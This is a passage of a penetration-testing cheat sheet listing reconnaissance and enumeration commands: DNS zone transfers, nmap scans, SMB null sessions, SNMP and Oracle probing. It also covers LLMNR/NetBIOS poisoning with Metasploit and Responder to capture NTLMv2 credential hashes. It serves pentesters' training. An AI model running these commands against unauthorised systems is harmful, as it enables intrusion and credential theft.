+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#identifying-if-c-code-is-for-windows-or-linux" id="markdown-toc-identifying-if-c-code-is-for-windows-or-linux">Identifying if C code is for Windows or Linux</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#build-exploit-gcc" id="markdown-toc-build-exploit-gcc">Build Exploit GCC</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#gcc-compile-32bit-exploit-on-64bit-kali" id="markdown-toc-gcc-compile-32bit-exploit-on-64bit-kali">GCC Compile 32Bit Exploit on 64Bit Kali</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compile-windows-exe-on-linux" id="markdown-toc-compile-windows-exe-on-linux">Compile Windows .exe on Linux</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-binary" id="markdown-toc-suid-binary">SUID Binary</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-c-shell-for-binbash" id="markdown-toc-suid-c-shell-for-binbash">SUID C Shell for /bin/bash</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-c-shell-for-binsh" id="markdown-toc-suid-c-shell-for-binsh">SUID C Shell for /bin/sh</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#building-the-suid-shell-binary" id="markdown-toc-building-the-suid-shell-binary">Building the SUID Shell binary</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#reverse-shells" id="markdown-toc-reverse-shells">Reverse Shells</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#tty-shells" id="markdown-toc-tty-shells">TTY Shells</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#python-tty-shell-trick" id="markdown-toc-python-tty-shell-trick">Python TTY Shell Trick</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-interactive-sh-shell" id="markdown-toc-spawn-interactive-sh-shell">Spawn Interactive sh shell</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-perl-tty-shell" id="markdown-toc-spawn-perl-tty-shell">Spawn Perl TTY Shell</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-ruby-tty-shell" id="markdown-toc-spawn-ruby-tty-shell">Spawn Ruby TTY Shell</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-lua-tty-shell" id="markdown-toc-spawn-lua-tty-shell">Spawn Lua TTY Shell</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-tty-shell-from-vi" id="markdown-toc-spawn-tty-shell-from-vi">Spawn TTY Shell from Vi</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#spawn-tty-shell-nmap" id="markdown-toc-spawn-tty-shell-nmap">Spawn TTY Shell NMAP</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-cheat-sheet" id="markdown-toc-metasploit-cheat-sheet">Metasploit Cheat Sheet</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-payloads" id="markdown-toc-meterpreter-payloads">Meterpreter Payloads</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-reverse-meterpreter-payload" id="markdown-toc-windows-reverse-meterpreter-payload">Windows reverse meterpreter payload</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#windows-vnc-meterpreter-payload" id="markdown-toc-windows-vnc-meterpreter-payload">Windows VNC Meterpreter payload</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#linux-reverse-meterpreter-payload" id="markdown-toc-linux-reverse-meterpreter-payload">Linux Reverse Meterpreter payload</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-cheat-sheet" id="markdown-toc-meterpreter-cheat-sheet">Meterpreter Cheat Sheet</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#common-metasploit-modules" id="markdown-toc-common-metasploit-modules">Common Metasploit Modules</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#remote-windows-metasploit-modules-exploits" id="markdown-toc-remote-windows-metasploit-modules-exploits">Remote Windows Metasploit Modules (exploits)</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#local-windows-metasploit-modules-exploits" id="markdown-toc-local-windows-metasploit-modules-exploits">Local Windows Metasploit Modules (exploits)</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#auxilary-metasploit-modules" id="markdown-toc-auxilary-metasploit-modules">Auxilary Metasploit Modules</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-powershell-modules" id="markdown-toc-metasploit-powershell-modules">Metasploit Powershell Modules</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#post-exploit-windows-metasploit-modules" id="markdown-toc-post-exploit-windows-metasploit-modules">Post Exploit Windows Metasploit Modules</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ascii-table-cheat-sheet" id="markdown-toc-ascii-table-cheat-sheet">ASCII Table Cheat Sheet</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cisco-ios-commands" id="markdown-toc-cisco-ios-commands">CISCO IOS Commands</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cryptography" id="markdown-toc-cryptography">Cryptography</a> <ul>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hash-lengths" id="markdown-toc-hash-lengths">Hash Lengths</a></li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#hash-examples" id="markdown-toc-hash-examples">Hash Examples</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#sqlmap-examples" id="markdown-toc-sqlmap-examples">SQLMap Examples</a></li>
+</ul>
+<h2 id="pre-engagement">Pre-engagement<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pre-engagement"><i class="fa fa-link"></i></a></h2>
+<h3 id="network-configuration">Network Configuration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#network-configuration"><i class="fa fa-link"></i></a></h3>
+<h4 id="set-ip-address">Set IP Address<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#set-ip-address"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>ifconfig eth0 xxx.xxx.xxx.xxx/24 
+</code></pre>
+</div>
+<h4 id="subnetting">Subnetting<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#subnetting"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>ipcalc xxx.xxx.xxx.xxx/24 
+ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
+</code></pre>
+</div>
+<h2 id="osint">OSINT<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#osint"><i class="fa fa-link"></i></a></h2>
+<h3 id="passive-information-gathering">Passive Information Gathering<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#passive-information-gathering"><i class="fa fa-link"></i></a></h3>
+<h4 id="dns">DNS<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns"><i class="fa fa-link"></i></a></h4>
+<h5 id="whois-enumeration">WHOIS enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#whois-enumeration"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>whois domain-name-here.com 
+</code></pre>
+</div>
+<h5 id="perform-dns-ip-lookup">Perform DNS IP Lookup<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-dns-ip-lookup"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>dig a domain-name-here.com @nameserver 
+</code></pre>
+</div>
+<h5 id="perform-mx-record-lookup">Perform MX Record Lookup<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-mx-record-lookup"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>dig mx domain-name-here.com @nameserver
+</code></pre>
+</div>
+<h5 id="perform-zone-transfer-with-dig">Perform Zone Transfer with DIG<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#perform-zone-transfer-with-dig"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>dig axfr domain-name-here.com @nameserver
+</code></pre>
+</div>
+<h2 id="dns-zone-transfers">DNS Zone Transfers<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-zone-transfers"><i class="fa fa-link"></i></a></h2>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></p>
+</td>
+<td>
+<p>Windows DNS zone transfer</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>dig axfr blah.com @ns1.blah.com</code></p>
+</td>
+<td>
+<p>Linux DNS zone transfer</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="email">Email<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#email"><i class="fa fa-link"></i></a></h4>
+<h5 id="simply-email">Simply Email<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#simply-email"><i class="fa fa-link"></i></a></h5>
+<p>Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn’t think you’re a robot and make you fill out a Captcha.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git
+./SimplyEmail.py -all -e TARGET-DOMAIN
+</code></pre>
+</div>
+<p>Simply Email can verify the discovered email addresss after gathering.</p>
+<h3 id="semi-active-information-gathering">Semi Active Information Gathering<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#semi-active-information-gathering"><i class="fa fa-link"></i></a></h3>
+<h4 id="basic-finger-printing">Basic Finger Printing<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#basic-finger-printing"><i class="fa fa-link"></i></a></h4>
+<p>Manual finger printing / banner grabbing.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>nc -v 192.168.1.1 25</code></p>
+<p><code>telnet 192.168.1.1 25</code></p>
+</td>
+<td>
+<p>Basic versioning / finger printing via displayed banner</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="banner-grabbing-with-nc">Banner grabbing with NC<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#banner-grabbing-with-nc"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>nc TARGET-IP 80
+GET / HTTP/1.1
+Host: TARGET-IP
+User-Agent: Mozilla/5.0
+Referrer: meh-domain
+&lt;enter&gt;
+</code></pre>
+</div>
+<h3 id="active-information-gathering">Active Information Gathering<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#active-information-gathering"><i class="fa fa-link"></i></a></h3>
+<h4 id="dns-bruteforce">DNS Bruteforce<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-bruteforce"><i class="fa fa-link"></i></a></h4>
+<h5 id="dnsrecon">DNSRecon<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dnsrecon"><i class="fa fa-link"></i></a></h5>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">DNS Enumeration Kali - DNSRecon</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span>
+</p>
+</div>
+</div>
+</section>
+<h4 id="port-scanning">Port Scanning<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#port-scanning"><i class="fa fa-link"></i></a></h4>
+<h5 id="nmap-commands">Nmap Commands<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-commands"><i class="fa fa-link"></i></a></h5>
+<p>For more commands, see the Nmap cheat sheet (link in the menu on the right).</p>
+<p>Basic Nmap Commands:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>nmap -v -sS -A -T4 target</code></p>
+</td>
+<td>
+<p>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>nmap -v -sS -p--A -T4 target</code></p>
+</td>
+<td>
+<p>As above but scans all TCP ports (takes a lot longer)</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>nmap -v -sU -sS -p- -A -T4 target</code></p>
+</td>
+<td>
+<p>As above but scans all TCP ports and UDP scan (takes even longer)</p>
+</td>
+</tr><tr>
+<td>
+<p><code>nmap -v -p 445 --script=smb-check-vulns <br>--script-args=unsafe=1 192.168.1.X</code></p>
+</td>
+<td>
+<p>Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover</p>
+</td>
+</tr>
+<tr><td>
+<p><code>ls /usr/share/nmap/scripts/* | grep ftp</code></p>
+</td>
+<td>
+<p>Search nmap scripts for keywords</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>I’ve had a few people mention about T4 scans, apply common sense here. Don’t use T4 commands on external pen tests (when using an Internet connection), you’re probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.</p>
+<h6 id="nmap-udp-scanning">Nmap UDP Scanning<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-udp-scanning"><i class="fa fa-link"></i></a></h6>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sU TARGET 
+</code></pre>
+</div>
+<h6 id="udp-protocol-scanner">UDP Protocol Scanner<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#udp-protocol-scanner"><i class="fa fa-link"></i></a></h6>
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/portcullislabs/udp-proto-scanner.git
+</code></pre>
+</div>
+<p>Scan a file of IP addresses for all services:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./udp-protocol-scanner.pl -f ip.txt 
+</code></pre>
+</div>
+<p>Scan for a specific UDP service:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>udp-proto-scanner.pl -p ntp -f ips.txt
+</code></pre>
+</div>
+<h6 id="other-host-discovery">Other Host Discovery<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#other-host-discovery"><i class="fa fa-link"></i></a></h6>
+<p>Other methods of host discovery, that don’t use nmap…</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>netdiscover -r 192.168.1.0/24</code></p>
+</td>
+<td>
+<p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="enumeration--attacking-network-services">Enumeration &amp; Attacking Network Services<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumeration--attacking-network-services"><i class="fa fa-link"></i></a></h2>
+<p>Penetration testing tools that spefically identify and / or enumerate network services:</p>
+<h3 id="samb--smb--windows-domain-enumeration">SAMB / SMB / Windows Domain Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#samb--smb--windows-domain-enumeration"><i class="fa fa-link"></i></a></h3>
+<h4 id="samba-enumeration">Samba Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#samba-enumeration"><i class="fa fa-link"></i></a></h4>
+<h5 id="smb-enumeration-tools">SMB Enumeration Tools<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#smb-enumeration-tools"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+</code></pre>
+</div>
+<p>Also see, nbtscan cheat sheet (right hand menu).</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>nbtscan 192.168.1.0/24</code></p>
+</td>
+<td><p>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</p></td>
+</tr>
+<tr>
+<td>
+<p><code>enum4linux -a target-ip</code></p>
+</td>
+<td>
+<p>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h5 id="fingerprint-smb-version">Fingerprint SMB Version<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#fingerprint-smb-version"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>smbclient -L //192.168.1.100 
+</code></pre>
+</div>
+<h5 id="find-open-smb-shares">Find open SMB Shares<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#find-open-smb-shares"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
+</code></pre>
+</div>
+<h5 id="enumerate-smb-users">Enumerate SMB Users<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#enumerate-smb-users"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
+</code></pre>
+</div>
+<div class="highlighter-rouge"><pre class="highlight"><code>python /usr/share/doc/python-impacket-doc/examples
+/samrdump.py 192.168.XXX.XXX
+</code></pre>
+</div>
+<p>RID Cycling:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
+</code></pre>
+</div>
+<p>Metasploit module for RID cycling:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>use auxiliary/scanner/smb/smb_lookupsid
+</code></pre>
+</div>
+<h5 id="manual-null-session-testing">Manual Null session testing:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#manual-null-session-testing"><i class="fa fa-link"></i></a></h5>
+<p>Windows:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>net use \\TARGET\IPC$ "" /u:""
+</code></pre>
+</div>
+<p>Linux:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>smbclient -L //192.168.99.131
+</code></pre>
+</div>
+<h5 id="nbtscan-unixwiz">NBTScan unixwiz<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nbtscan-unixwiz"><i class="fa fa-link"></i></a></h5>
+<p>Install on Kali rolling:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install nbtscan-unixwiz 
+nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan
+</code></pre>
+</div>
+<h3 id="llmnr--nbt-ns-spoofing">LLMNR / NBT-NS Spoofing<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#llmnr--nbt-ns-spoofing"><i class="fa fa-link"></i></a></h3>
+<p>Steal credentials off the network.</p>
+<h5 id="metasploit-llmnr--netbios-requests">Metasploit LLMNR / NetBIOS requests<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-llmnr--netbios-requests"><i class="fa fa-link"></i></a></h5>
+<p>Spoof / poison LLMNR / NetBIOS requests:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>auxiliary/spoof/llmnr/llmnr_response
+auxiliary/spoof/nbns/nbns_response
+</code></pre>
+</div>
+<p>Capture the hashes:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>auxiliary/server/capture/smb
+auxiliary/server/capture/http_ntlm
+</code></pre>
+</div>
+<p>You’ll end up with NTLMv2 hash, use john or hashcat to crack it.</p>
+<h4 id="responderpy">Responder.py<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#responderpy"><i class="fa fa-link"></i></a></h4>
+<p>Alternatively you can use responder.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/SpiderLabs/Responder.git
+python Responder.py -i local-ip -I eth0
+</code></pre>
+</div>
+<div class="note tip">
+<h5>Run Responder.py for the whole engagement</h5>
+<p>Run Responder.py for the length of the engagement while you're working on other attack vectors.</p>
+</div>
+<h3 id="snmp-enumeration-tools">SNMP Enumeration Tools<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmp-enumeration-tools"><i class="fa fa-link"></i></a></h3>
+<p>A number of SNMP enumeration tools.</p>
+<p>Fix SNMP output values so they are human readable:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install snmp-mibs-downloader download-mibs
+echo "" &gt; /etc/snmp/snmp.conf
+</code></pre>
+</div>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>snmpcheck -t 192.168.1.X -c public</code></p>
+<p><code>snmpwalk -c public -v1 192.168.1.X 1| <br> grep hrSWRunName|cut -d* * -f </code></p>
+<p><code>snmpenum -t 192.168.1.X</code></p>
+<p><code>onesixtyone -c names -i hosts</code></p>
+</td>
+<td>SNMP enumeration</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="snmpv3-enumeration-tools">SNMPv3 Enumeration Tools<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#snmpv3-enumeration-tools"><i class="fa fa-link"></i></a></h4>
+<p>Idenitfy SNMPv3 servers with nmap:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
+</code></pre>
+</div>
+<p>Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install snmp snmp-mibs-downloader
+wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
+</code></pre>
+</div>
+<div class="note tip">
+<h5>Use Metasploits Wordlist</h5>
+<p>Metasploit's wordlist (KALI path below) has common credentials for v1 &amp; 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).</p>
+</div>
+<div class="highlighter-rouge"><pre class="highlight"><code>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
+</code></pre>
+</div>
+<h3 id="r-services-enumeration">R Services Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#r-services-enumeration"><i class="fa fa-link"></i></a></h3>
+<p>This is legacy, included for completeness.</p>
+<p>nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:</p>
+<h4 id="rsh-enumeration">RSH Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rsh-enumeration"><i class="fa fa-link"></i></a></h4>
+<h5 id="rsh-run-commands">RSH Run Commands<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rsh-run-commands"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>rsh &lt;target&gt; &lt;command&gt;
+</code></pre>
+</div>
+<h5 id="metasploit-rsh-login-scanner">Metasploit RSH Login Scanner<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-rsh-login-scanner"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>auxiliary/scanner/rservices/rsh_login
+</code></pre>
+</div>
+<h5 id="rusers-show-logged-in-users">rusers Show Logged in Users<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rusers-show-logged-in-users"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>rusers -al 192.168.2.1
+</code></pre>
+</div>
+<h5 id="rusers-scan-whole-subnet">rusers scan whole Subnet<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rusers-scan-whole-subnet"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>rlogin -l &lt;user&gt; &lt;target&gt;
+</code></pre>
+</div>
+<p>e.g rlogin -l root TARGET-SUBNET/24</p>
+<h3 id="finger-enumeration">Finger Enumeration<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#finger-enumeration"><i class="fa fa-link"></i></a></h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>finger @TARGET-IP
+</code></pre>
+</div>
+<h4 id="finger-a-specific-username">Finger a Specific Username<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#finger-a-specific-username"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>finger batman@TARGET-IP 
+</code></pre>
+</div>
+<h4 id="solaris-bug-that-shows-all-logged-in-users">Solaris bug that shows all logged in users:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#solaris-bug-that-shows-all-logged-in-users"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>finger 0@host  
+
+SunOS: RPC services allow user enum:
+$ rusers # users logged onto LAN
+
+finger 'a b c d e f g h'@sunhost 
+</code></pre>
+</div>
+<h3 id="rwho">rwho<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#rwho"><i class="fa fa-link"></i></a></h3>
+<p>Use nmap to identify machines running rwhod (513 UDP)</p>
+<h2 id="tls--ssl-testing">TLS &amp; SSL Testing<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#tls--ssl-testing"><i class="fa fa-link"></i></a></h2>
+<h3 id="testsslsh">testssl.sh<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#testsslsh"><i class="fa fa-link"></i></a></h3>
+<p>Test all the things on a single host and output to a .html file:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  
+</code></pre>
+</div>
+<h2 id="vulnerability-assessment">Vulnerability Assessment<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vulnerability-assessment"><i class="fa fa-link"></i></a></h2>
+<p>Install OpenVAS 8 on Kali Rolling:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get update
+apt-get dist-upgrade -y
+apt-get install openvas
+openvas-setup
+</code></pre>
+</div>
+<p>Verify openvas is running using:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>netstat -tulpn
+</code></pre>
+</div>
+<p>Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup.</p>
+<h2 id="database-penetration-testing">Database Penetration Testing<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#database-penetration-testing"><i class="fa fa-link"></i></a></h2>
+<p>Attacking database servers exposed on the network.</p>
+<h3 id="oracle">Oracle<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle"><i class="fa fa-link"></i></a></h3>
+<p>Install oscanner:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install oscanner  
+</code></pre>
+</div>
+<p>Run oscanner:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>oscanner -s 192.168.1.200 -P 1521 
+</code></pre>
+</div>
+<h4 id="fingerprint-oracle-tns-version">Fingerprint Oracle TNS Version<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#fingerprint-oracle-tns-version"><i class="fa fa-link"></i></a></h4>
+<p>Install tnscmd10g:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install tnscmd10g
+</code></pre>
+</div>
+<p>Fingerprint oracle tns:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>tnscmd10g version -h TARGET
+nmap --script=oracle-tns-version 
